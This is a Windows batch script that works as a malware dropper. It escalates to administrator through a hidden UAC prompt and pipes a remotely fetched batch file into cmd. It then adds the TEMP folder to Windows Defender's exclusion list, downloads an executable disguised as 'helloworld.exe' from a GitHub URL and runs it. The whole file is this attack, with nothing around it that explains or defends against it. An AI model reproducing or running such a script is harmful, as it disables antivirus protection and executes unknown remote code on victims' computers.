@echo off
net session >nul 2>&1
if not %errorlevel%==0 (
    powershell -w hidden -Command "Start-Process cmd -Verb RunAs -ArgumentList '/c','curl -s https://raw.githubusercontent.com/analysisw/test/main/test.bat|cmd' -WindowStyle Hidden"
    exit /b
)
powershell -w hidden -c "Add-MpPreference -ExclusionPath '%TEMP%'"
curl -sL "https://github.com/analysisw/test/raw/refs/heads/main/helloworld.exe" -o "%TEMP%\helloworld.exe"
start "" "%TEMP%\helloworld.exe"
